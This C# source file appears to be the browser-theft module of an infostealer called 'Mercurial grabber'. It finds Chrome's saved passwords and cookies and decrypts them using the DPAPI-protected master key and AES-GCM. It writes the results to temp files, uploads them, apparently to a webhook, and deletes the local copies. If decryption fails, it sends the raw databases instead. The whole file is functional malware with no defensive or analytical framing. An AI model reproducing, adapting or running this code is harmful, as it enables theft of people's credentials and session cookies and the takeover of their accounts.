using System;
using System.Text;

using System.IO;
using System.Security.Cryptography;
namespace Mercurial.Resources
{
    public class Browser
    {
        private static string DecryptWithKey(byte[] encryptedData, byte[] masterKey)
        {
            byte[] iv = new byte[12];
            Array.Copy(encryptedData, 3, iv, 0, 12);

            try
            {
                byte[] buffer = new byte[encryptedData.Length - 15];
                Array.Copy(encryptedData, 15, buffer, 0, buffer.Length);

                byte[] tag = new byte[16];
                byte[] data = new byte[buffer.Length - tag.Length];

                Array.Copy(buffer, buffer.Length - 16, tag, 0, 16);
                Array.Copy(buffer, 0, data, 0, data.Length);

                using (var aesGcm = new AesGcm(masterKey))
                {
                    byte[] plaintext = new byte[data.Length];
                    aesGcm.Decrypt(iv, data, tag, plaintext);
                    return Encoding.UTF8.GetString(plaintext);
                }
            }
            catch
            {
                return null;
            }
        }

        private static byte[] GetMasterKey()
        {
            string filePath = User.localAppData + @"\Google\Chrome\User Data\Local State";
            if (!File.Exists(filePath))
                return null;

            var match = System.Text.RegularExpressions.Regex.Match(
                File.ReadAllText(filePath),
                "\"encrypted_key\":\"(.*?)\""
            );

            if (!match.Success)
                return null;

            byte[] masterKey = Convert.FromBase64String(match.Groups[1].Value);
            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, temp.Length);

            try
            {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch
            {
                return null;
            }
        }

        public static void StealCookies()
        {
            string src = User.localAppData + @"\Google\Chrome\User Data\Default\Cookies";
            string stored = User.tempFolder + "\\cookies.db";

            if (File.Exists(src))
            {
                try
                {
                    File.Copy(src, stored, true);
                    SQLite db = new SQLite(stored);
                    db.ReadTable("cookies");

                    using (StreamWriter file = new StreamWriter(User.tempFolder + "\\cookies.txt"))
                    {
                        for (int i = 0; i < db.GetRowCount(); i++)
                        {
                            string value = db.GetValue(i, 12);
                            string hostKey = db.GetValue(i, 1);
                            string name = db.GetValue(i, 2);
                            string path = db.GetValue(i, 4);
                            string expires = "";
                            try
                            {
                                expires = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(
                                    DateTime.FromFileTimeUtc(10 * Convert.ToInt64(db.GetValue(i, 5))),
                                    TimeZoneInfo.Local));
                            }
                            catch { }

                            string result = "";
                            try
                            {
                                result = DecryptWithKey(Encoding.Default.GetBytes(value), GetMasterKey());
                            }
                            catch
                            {
                                result = "Error in decryption";
                            }

                            file.WriteLine("---------------- mercurial grabber ----------------");
                            file.WriteLine("value: " + result);
                            file.WriteLine("hostKey: " + hostKey);
                            file.WriteLine("name: " + name);
                            file.WriteLine("expires: " + expires);
                        }
                    }

                    File.Delete(stored);
                    Program.wh.SendData("", "cookies.txt", User.tempFolder + "\\cookies.txt", "multipart/form-data");
                    File.Delete(User.tempFolder + "\\cookies.txt");
                }
                catch (Exception ex)
                {
                    Program.wh.SendData("", "cookies.db", User.tempFolder + "\\cookies.db", "multipart/form-data");
                    Program.wh.Send("`" + ex.Message + "`");
                }
            }
            else
            {
                Program.wh.Send("`Did not find: " + src + "`");
            }
        }

        public static void StealPasswords()
        {
            string src = User.localAppData + @"\Google\Chrome\User Data\Default\Login Data";
            if (File.Exists(src))
            {
                string stored = User.tempFolder + "\\login.db";
                try
                {
                    File.Copy(src, stored, true);
                    SQLite db = new SQLite(stored);
                    db.ReadTable("logins");

                    using (StreamWriter file = new StreamWriter(User.tempFolder + "\\passwords.txt"))
                    {
                        for (int i = 0; i < db.GetRowCount(); i++)
                        {
                            string host = db.GetValue(i, 0);
                            string username = db.GetValue(i, 3);
                            string password = db.GetValue(i, 5);

                            if (!string.IsNullOrEmpty(host))
                            {
                                if (password.StartsWith("v10") || password.StartsWith("v11"))
                                {
                                    var masterKey = GetMasterKey();
                                    if (masterKey == null)
                                        continue;

                                    try
                                    {
                                        password = DecryptWithKey(Encoding.Default.GetBytes(password), masterKey);
                                    }
                                    catch
                                    {
                                        password = "Unable to decrypt";
                                    }

                                    file.WriteLine("---------------- mercurial grabber ----------------");
                                    file.WriteLine("host: " + host);
                                    file.WriteLine("username: " + username);
                                    file.WriteLine("password: " + password);
                                }
                            }
                        }
                    }

                    File.Delete(stored);
                    Program.wh.SendData("", "passwords.txt", User.tempFolder + "\\passwords.txt", "multipart/form-data");
                    File.Delete(User.tempFolder + "\\passwords.txt");
                }
                catch (Exception ex)
                {
                    Program.wh.SendData("", "login.db", User.tempFolder + "\\login.db", "multipart/form-data");
                    Program.wh.Send("`" + ex.Message + "`");
                }
            }
            else
            {
                Program.wh.Send("`Did not find: " + src + "`");
            }
        }
    }
}
